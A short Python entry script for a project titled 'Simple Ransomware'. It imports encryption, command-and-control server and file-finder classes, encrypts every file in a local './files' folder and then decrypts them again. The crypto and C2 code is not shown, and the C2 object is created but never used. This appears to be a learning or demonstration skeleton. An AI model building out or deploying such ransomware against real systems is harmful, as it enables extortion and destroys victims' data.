# Simple Ransomware - Shinji Mimura

# Import Classes
from os import PRIO_PGRP
from crypto.main import CryptClass
from server.main import C2Server
from utils.filefinder import FileFinder

# Import packages
import time

if __name__ == "__main__":

    # Classes
    cryptclass = CryptClass()
    c2server = C2Server()
    filefinder = FileFinder()

    # Files in folder
    filefinder.filepaths("./files")

    # Encrypt files
    for f in filefinder.file_paths:
        cryptclass.encrypt(f)

    print("="*10)
    time.sleep(2)

    # Decrypt files
    for f in filefinder.file_paths:
        cryptclass.decrypt(f)
